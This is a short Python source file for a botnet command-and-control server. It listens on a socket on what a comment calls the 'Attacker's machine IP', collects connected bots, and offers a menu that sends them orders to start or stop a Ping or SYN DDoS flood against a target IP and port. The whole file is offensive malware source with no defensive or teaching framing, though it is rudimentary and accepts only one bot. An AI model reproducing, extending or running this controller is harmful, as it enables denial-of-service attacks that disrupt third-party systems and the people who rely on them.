import socket
import sys

def commands(option):
	if option == 1:
		target_ip = input("Enter target IP address: ").encode()
		target_port = input("Enter target port: ").encode()
		ddos_type = input("Enter type of DDoS attack (Ping/SYN): ").encode()
		for bot in bots:
			bot.send("DDoS_".encode() + target_ip + "_".encode() + target_port + "_".encode() + ddos_type)
		print("Starting DDoS on target...")
	
	elif option == 2:
		for bot in bots:
			bot.send("Stop attack".encode())
		print("Stopping DDoS on target...")

	elif option == 3:
		for bot in bots:
			bot.send("Exit program".encode())
			bot.close()
		print("Exiting program...")
		sock.close
		sys.exit()
	
	else:
		print("You entered an invalid option!")

ip = "localhost" #Attacker's machine IP
port = 9999
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip, port))
sock.listen(5)
bots = []
first_connection = False

print("Waiting for connections...")

while True:
	if first_connection == False:
		bot, ip = sock.accept()
		bots.append(bot)
		print("{} successfully connected!".format(ip))
	
	print("""Enter a number to send commands to bots...
		1. Start DDoS attack
		2. Stop DDoS attack
		3. Exit botnet program""")
	user_option = int(input("Enter option number: "))
	commands(user_option)
	first_connection = True